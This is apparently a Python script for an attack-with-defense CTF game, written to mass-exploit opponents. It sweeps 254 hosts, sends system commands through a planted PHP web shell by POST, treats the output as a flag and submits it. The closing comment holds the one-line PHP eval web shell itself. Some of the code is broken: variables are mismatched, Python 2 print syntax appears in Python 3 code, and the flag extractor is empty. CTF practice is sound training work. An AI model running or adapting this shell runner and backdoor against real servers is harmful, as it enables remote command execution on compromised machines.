import requests

from lib.log import outputscreen
from submitFlag import submit_flag

'''利用正则/切片匹配flag'''
def extract_flag(content):
    flag = content
    return flag


def web_shell_exec(shell_url,shell_method,shell_password,shell_command):
    info=open("info.txt","w")
    if shell_method=="GET":
        try:
            res = requests.get(url=f"{shell_url}+?{shell_password}={shell_command}",timeout=1)
            if res.status_code == requests.codes.ok:
                result = url+" connect shell sucess" + res.text
                outputscreen.success(result)
                print >>info,result
                return res.text
        except:
            outputscreen.error(shell_url + " connect shell fail!")    
            return ''
    
    if shell_method=="POST":
        try:
            res = requests.post(url=url,data={shell_password:shell_command},timeout=1)
            if res.status_code == requests.codes.ok:
                result = url+" connect shell sucess" + res.text
                outputscreen.success(result)
                return res.text
        except:
            outputscreen.error(shell_url + " connect shell fail!")
            return ''

    info.close()



token = 'test'
event = 'test'

for i in range(1,255):
    url=f"http://192-168-1-{i}.awd.bugku.cn/upload/admin/shell.php"
    command='system("ls");'
    cmdRes = web_shell_exec(url,"POST","L0nm4r",command)
    flag = extract_flag(cmdRes)
    if flag !='':
        submit_flag(url,flag,token,event)

'''
<?php @eval($_POST["l0nm4r"]);?>
'''
